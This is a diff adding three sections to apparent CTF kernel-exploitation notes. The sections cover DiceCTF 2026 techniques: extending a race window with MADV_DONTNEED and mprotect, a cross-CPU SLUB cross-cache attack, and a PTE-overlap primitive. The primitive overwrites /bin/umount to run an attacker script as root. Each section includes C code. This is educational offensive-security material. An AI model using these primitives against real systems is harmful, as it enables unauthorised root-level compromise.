@@ -32,6 +32,9 @@
   - [Freelist Pointer Hardening](#freelist-pointer-hardening)
   - [Freelist Obfuscation (CONFIG_SLAB_FREELIST_HARDEN)](#freelist-obfuscation-config_slab_freelist_harden)
 - [Leak via Kernel Panic](#leak-via-kernel-panic)
+- [Race Window Extension via MADV_DONTNEED + mprotect (DiceCTF 2026)](#race-window-extension-via-madv_dontneed--mprotect-dicectf-2026)
+- [Cross-Cache Attack via CPU-Split Strategy (DiceCTF 2026)](#cross-cache-attack-via-cpu-split-strategy-dicectf-2026)
+- [PTE Overlap Primitive for File Write (DiceCTF 2026)](#pte-overlap-primitive-for-file-write-dicectf-2026)
 
 For protection bypass techniques (KASLR, FGKASLR, KPTI, SMEP, SMAP), GDB debugging, initramfs workflow, and exploit templates, see [kernel-bypass.md](kernel-bypass.md).
 
@@ -640,3 +643,107 @@ jmp &flag   ; jump to the address of the flag file content in memory
 The kernel panics and the panic message includes the faulting instruction bytes in the `CODE` section -- these bytes are the flag content.
 
 **Prerequisites:** No KASLR (or full layout knowledge), `initramfs` (flag is loaded into kernel memory), RIP control.
+
+---
+
+## Race Window Extension via MADV_DONTNEED + mprotect (DiceCTF 2026)
+
+**Pattern (cornelslop):** Kernel module has a TOCTOU race between check and delete paths, but the window is too narrow to hit reliably. Extend the race window from milliseconds to dozens of seconds by forcing repeated page faults during the long-running kernel operation.
+
+**Technique:**
+1. Map memory used by the kernel check operation (e.g., `sha256_va_range()` reading userland pages)
+2. From a second thread, loop `MADV_DONTNEED` (drops page table entries) + `mprotect()` (toggles permissions)
+3. Each fault during the kernel's hash computation forces VMA lock acquisition and page fault handling
+4. The kernel operation stalls repeatedly, keeping the race window open
+
+```c
+// Thread 1: trigger the vulnerable CHECK ioctl (long-running hash)
+ioctl(fd, CHECK_ENTRY, &entry);
+
+// Thread 2: extend race window by forcing repeated faults
+while (racing) {
+    madvise(buf, PAGE_SIZE, MADV_DONTNEED);  // drop PTE
+    mprotect(buf, PAGE_SIZE, PROT_READ);      // force fault on next access
+    mprotect(buf, PAGE_SIZE, PROT_READ | PROT_WRITE);  // restore
+}
+
+// Thread 3: trigger the concurrent DEL ioctl
+ioctl(fd, DEL_ENTRY, &entry);  // races with CHECK path
+```
+
+**Key insight:** `MADV_DONTNEED` drops page table entries without freeing the underlying pages. When the kernel next accesses that userland memory (e.g., during a hash computation), it faults and must re-establish the mapping. Combined with `mprotect()` toggling, this creates lock contention that extends any kernel operation touching userland pages from sub-millisecond to tens of seconds — turning impractical race conditions into reliable exploits.
+
+---
+
+## Cross-Cache Attack via CPU-Split Strategy (DiceCTF 2026)
+
+**Pattern (cornelslop):** Vulnerable object is in a dedicated SLUB cache (not `kmalloc-*`), preventing standard same-cache reclaim after a double-free. Force pages out of the dedicated cache into the buddy allocator by splitting allocation and deallocation across CPUs.
+
+**Technique:**
+1. **Allocate N objects on CPU 0** — fills slab pages on CPU 0's partial list
+2. **Free the same objects from CPU 1** — freed objects go to CPU 1's partial list (not CPU 0's)
+3. CPU 1's partial list overflows to the **node partial list**
+4. Completely empty slabs are released to the **PCP (per-CPU page) list**, then to the **buddy allocator**
+5. Reallocate those pages as a different object type (e.g., page tables)
+
+```c
+// Pin allocation thread to CPU 0
+cpu_set_t set;
+CPU_ZERO(&set);
+CPU_SET(0, &set);
+sched_setaffinity(0, sizeof(set), &set);
+
+// Allocate MAX_ENTRIES objects (fills ~3 slab pages)
+for (int i = 0; i < MAX_ENTRIES; i++)
+    ioctl(fd, ALLOC_ENTRY, &entries[i]);
+
+// Pin free thread to CPU 1
+CPU_SET(1, &set);
+sched_setaffinity(0, sizeof(set), &set);
+
+// Free from different CPU — objects land on CPU 1's partial list
+for (int i = 0; i < MAX_ENTRIES; i++)
+    ioctl(fd, FREE_ENTRY, &entries[i]);
+// Empty slabs flow: CPU1 partial → node partial → PCP → buddy allocator
+```
+
+**Key insight:** SLUB allocates and frees per-CPU. When an object is freed on a different CPU than where it was allocated, it enters a different partial list. When that list overflows, empty slabs are returned to the buddy allocator — escaping the dedicated cache entirely. This enables cross-cache attacks even against custom `kmem_cache_create()` caches that are immune to standard heap spray.
+
+---
+
+## PTE Overlap Primitive for File Write (DiceCTF 2026)
+
+**Pattern (cornelslop):** After reclaiming a freed page as a PTE (page table entry) page, overlap an anonymous writable mapping and a read-only file mapping so both are backed by the same physical page via corrupted PTEs.
+
+**Technique:**
+1. Trigger cross-cache double-free to get a page into the buddy allocator
+2. Allocate a new anonymous mapping — kernel uses the freed page as a PTE page
+3. Map a read-only file (e.g., `/bin/umount`) into the same PTE region
+4. The corrupted PTE page now has entries pointing to the file's physical pages
+5. Write through the anonymous (writable) mapping → modifies the file's pages directly
+6. Overwrite the file's shebang/header to execute an attacker-controlled script
+
+```c
+// After cross-cache frees page into buddy allocator:
+
+// 1. Anonymous mapping reclaims the page as PTE storage
+char *anon = mmap(NULL, PAGE_SIZE * 512, PROT_READ | PROT_WRITE,
+                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+// Touch pages to populate PTEs in the reclaimed page
+for (int i = 0; i < 512; i++)
+    anon[i * PAGE_SIZE] = 'A';
+
+// 2. File mapping into overlapping virtual range
+int file_fd = open("/bin/umount", O_RDONLY);
+char *file_map = mmap(target_addr, PAGE_SIZE, PROT_READ,
+                      MAP_PRIVATE | MAP_FIXED, file_fd, 0);
+
+// 3. Write through anonymous side corrupts file content
+// Overwrite ELF header / shebang with #!/tmp/pwn
+memcpy(anon + offset, "#!/tmp/pwn\n", 11);
+
+// 4. Execute the corrupted binary → runs attacker script as root
+system("/bin/umount /tmp 2>/dev/null");
+```
+
+**Key insight:** PTE pages are just regular physical pages repurposed by the kernel's page table allocator. If a freed slab page is reclaimed as a PTE page, both the original (corrupted) slab entries and the new PTE entries coexist. By carefully overlapping anonymous and file-backed mappings in the same PTE page, writes to the anonymous mapping transparently modify file-backed pages — achieving arbitrary file write without any direct kernel write primitive. This bypasses all standard file permission checks since the write happens at the physical page level.
